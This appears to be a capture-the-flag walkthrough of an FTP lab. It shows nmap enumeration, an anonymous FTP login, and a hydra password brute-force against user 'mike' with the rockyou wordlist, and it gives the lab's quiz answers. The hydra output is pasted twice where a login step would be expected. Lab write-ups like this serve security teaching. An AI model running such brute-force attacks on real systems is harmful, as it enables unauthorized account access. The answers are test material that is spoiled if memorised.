![](https://miro.medium.com/max/1400/1*nPq72s8kz8yTbfxdHSPR3w.png)

Enumerating FTP
---------------

Spin up your target VM and let’s do a quick nmap scan to find what ports are open

```
#nmap -Pn -sV -sC 10.10.94.141Starting Nmap 7.60 ( [https://nmap.org](https://nmap.org) ) at 2022-03-01 15:21 GMT  
Nmap scan report for ip-10-10-94-141.eu-west-1.compute.internal (10.10.94.141)  
Host is up (0.0015s latency).  
Not shown: 999 closed ports  
PORT   STATE SERVICE VERSION  
21/tcp open  ftp     vsftpd 2.0.8 or later  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|\_-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC\_NOTICE.txt  
| ftp-syst:   
|   STAT:   
| FTP server status:  
|      Connected to ::ffff:10.10.136.57  
|      Logged in as ftp  
|      TYPE: ASCII  
|      No session bandwidth limit  
|      Session timeout in seconds is 300  
|      Control connection is plain text  
|      Data connections will be plain text  
|      At session startup, client count was 1  
|      vsFTPd 3.0.3 - secure, fast, stable  
|\_End of status  
MAC Address: 02:BC:72:67:5E:0B (Unknown)  
Service Info: Host: WelcomeService detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 13.78 seconds
```

There’s only one port open but the question expects two ports to be open

1.  How many **ports** are open on the target machine?

```
2
```

2\. What **port** is ftp running on?

```
21
```

3\. What **variant** of FTP is running on it?

```
vsftpd
```

You can answer the next question by looking at the nmap scan results

4\. What is the name of the file in the anonymous FTP directory?

```
PUBLIC\_NOTICE.txt
```

We can see that the FTP is configured to allow anonymous logins, that means we login without a password and a username ‘anonymous’

```
\# ftp 10.10.94.141  
Connected to 10.10.94.141.  
220 Welcome to the administrator FTP service.  
Name (10.10.94.141:root): anonymous  
331 Please specify the password.  
Password:  
230 Login successful.  
Remote system type is UNIX.  
Using binary mode to transfer files.  
ftp>
```

Now we are connected, use the command **HELP** to see all the available commands. Let’s open a file called PUBLIC\_NOTICE.txt

```
ftp> get PUBLIC\_NOTICE.txt -  
\===================================  
MESSAGE FROM SYSTEM ADMINISTRATORS  
\===================================Hello,I hope everyone is aware that the  
FTP server will not be available   
over the weekend- we will be   
carrying out routine system   
maintenance. Backups will be  
made to my account so I reccomend  
encrypting any sensitive data.Cheers,Mike
```

5\. What do we think a possible username could be?

```
mike
```

Exploiting FTP
--------------

Now we know the possible username and let’s try to brute force the login with hydra

```
\# hydra -t4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.94.141 ftp  
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra ([http://www.thc.org/thc-hydra](http://www.thc.org/thc-hydra)) starting at 2022-03-01 15:50:36  
\[DATA\] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task  
\[DATA\] attacking ftp://10.10.94.141:21/  
\[VERBOSE\] Resolving addresses ... \[VERBOSE\] resolving done  
\[ATTEMPT\] target 10.10.94.141 - login "mike" - pass "123456" - 1 of 14344398 \[child 0\] (0/0)  
\[ATTEMPT\] target 10.10.94.141 - login "mike" - pass "12345" - 2 of 14344398 \[child 1\] (0/0)  
\[ATTEMPT\] target 10.10.94.141 - login "mike" - pass "123456789" - 3 of 14344398 \[child 2\] (0/0)  
\[ATTEMPT\] target 10.10.94.141 - login "mike" - pass "password" - 4 of 14344398 \[child 3\] (0/0)  
\[21\]\[ftp\] host: 10.10.94.141   login: mike   password: password  
\[STATUS\] attack finished for 10.10.94.141 (waiting for children to complete tests)  
1 of 1 target successfully completed, 1 valid password found  
Hydra ([http://www.thc.org/thc-hydra](http://www.thc.org/thc-hydra)) finished at 2022-03-01 15:50:41
```

and we found the password is “password” and let’s login to find our flag.

```
\# hydra -t4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.94.141 ftp  
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra ([http://www.thc.org/thc-hydra](http://www.thc.org/thc-hydra)) starting at 2022-03-01 15:50:36  
\[DATA\] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task  
\[DATA\] attacking ftp://10.10.94.141:21/  
\[VERBOSE\] Resolving addresses ... \[VERBOSE\] resolving done  
\[ATTEMPT\] target 10.10.94.141 - login "mike" - pass "123456" - 1 of 14344398 \[child 0\] (0/0)  
\[ATTEMPT\] target 10.10.94.141 - login "mike" - pass "12345" - 2 of 14344398 \[child 1\] (0/0)  
\[ATTEMPT\] target 10.10.94.141 - login "mike" - pass "123456789" - 3 of 14344398 \[child 2\] (0/0)  
\[ATTEMPT\] target 10.10.94.141 - login "mike" - pass "password" - 4 of 14344398 \[child 3\] (0/0)  
\[21\]\[ftp\] host: 10.10.94.141   login: mike   password: password  
\[STATUS\] attack finished for 10.10.94.141 (waiting for children to complete tests)  
1 of 1 target successfully completed, 1 valid password found  
Hydra ([http://www.thc.org/thc-hydra](http://www.thc.org/thc-hydra)) finished at 2022-03-01 15:50:41
```

Use the below command to get the answer for the last question.

```
\# get ftp.txt - 
```

Thank you for reading.
